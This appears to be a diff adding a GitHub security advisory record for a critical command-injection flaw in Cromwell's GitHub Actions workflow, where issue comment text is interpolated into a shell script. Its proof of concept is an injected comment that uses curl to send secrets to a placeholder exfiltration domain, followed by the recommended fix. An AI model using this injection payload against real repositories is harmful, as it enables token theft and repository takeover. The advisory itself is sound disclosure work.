@@ -1,0 +1,62 @@
+{
+  "id": "GHSA-phf6-hm3h-x8qp",
+  "summary": "Cromwell GitHub Actions Secrets exfiltration via `Issue_comment`",
+  "details": "### Summary\nUsing `Issue_comment` on `.github/workflows/scalafmt-fix.yml` an attacker can inject malicious code using `github.event.comment.body`. By exploiting the vulnerability, it is possible to exfiltrate high privileged `GITHUB_TOKEN` which can be used to completely overtake the repo since the token has content privileges. In addition ,it is possible to exfiltrate also the secret:\n- `BROADBOT_GITHUB_TOKEN `\n\n### Details\nThe `Issue_comment` in GitHub Actions might be an injection path if the variable isn't handle as it should. In the following step it's vulnerable because it directly interpolates untrusted user input into a shell script.\n```\n      - name: Check for ScalaFmt Comment\n        id: check-comment\n        run: |\n          if [[ \"${{ github.event_name }}\" == \"issue_comment\" && \"${{ github.event.comment.body }}\" == *\"scalafmt\"* ]]; then\n            echo \"::set-output name=comment-triggered::true\"\n          else\n            echo \"::set-output name=comment-triggered::false\"\n          fi\n```\nIn this case, it is possible to exfiltrate `GITHUB_TOKEN` and `BROADBOT_GITHUB_TOKEN` secrets. \n\n### PoC\nTo exploit the vulnerability an attacker can just drop a comment to any issue formed in the following way to exploit the vulnerability in the workflow `.github/workflows/update_pylon_issue.yml`.\n```\ntest\" == \"test\" ]]; then\n  & curl -s -d \"$B64_BLOB\" \"https://$YOUR_EXFIL_DOMAIN/token\" > /dev/null # \n```\nTo prove this is possible, we created an issue and we added a comment with the malicious code to extract the `GITHUB_TOKEN` and `BROADBOT_GITHUB_TOKEN` secret. With the `GITHUB_TOKEN` extracted we were able to push a new poc tag which has been deleted after a couple of minutes.\n\n<img width=\"1603\" alt=\"Screenshot 2025-05-20 at 23 17 14\" src=\"https://github.com/user-attachments/assets/e2ebdb22-3d2d-467c-9326-34ca1e4b7ecf\" />\n\n\n### Impact\nUsually with GITHUB_TOKEN and write permissions, an attacker is able to completely overtake the repo. \n```\nGITHUB_TOKEN Permissions\n  Actions: write\n  Attestations: write\n  Checks: write\n  Contents: write\n  Deployments: write\n  Discussions: write\n  Issues: write\n  Metadata: read\n  Models: read\n  Packages: write\n  Pages: write\n  PullRequests: write\n  RepositoryProjects: write\n  SecurityEvents: write\n  Statuses: write\n```\nWe also checked `BROADBOT_GITHUB_TOKEN` permission to check if we could move laterally to org level. In this case the token seems scoped to this specific repo but it gives an attacker persistence without the need of a valid `GITHUB_TOKEN`.\nWe suggest to rotate the `BROADBOT_GITHUB_TOKEN` token asap.\n\n### Fix\n\n- Avoid directly interpolating untrusted user input into a shell script. Use GitHub Actions input context safely like:\n\n```\n- name: Dump comment\n  run: echo \"Comment Body: $BODY\"\n  env:\n    BODY: ${{ github.event.comment.body }}\n```\nThis safely passes the comment as an environment variable rather than interpolating it in-place.\n\n- Scope GIHTUB_TOKEN permissions to just what the actions needs to do. In this case, if it's specific for issues:\n```\npermissions:\n  issues: write\n```\n\nKindly reported by @darryk10 @AlbertoPellitteri @loresuso",
+  "modified": "2025-05-28T14:55:02Z",
+  "published": "2025-05-28T14:54:20Z",
+  "database_specific": {
+    "nvd_published_at": null,
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-05-28T14:54:20Z"
+  },
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/broadinstitute/cromwell/security/advisories/GHSA-phf6-hm3h-x8qp"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/broadinstitute/cromwell/commit/dc2c26abd31149e296f73ce4e43a36c0c0317b0d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/broadinstitute/cromwell"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "name": "broadinstitute/cromwell",
+        "ecosystem": "GitHub Actions"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "87"
+            },
+            {
+              "fixed": "90"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-phf6-hm3h-x8qp/GHSA-phf6-hm3h-x8qp.json"
+      },
+      "versions": []
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    }
+  ]
+}
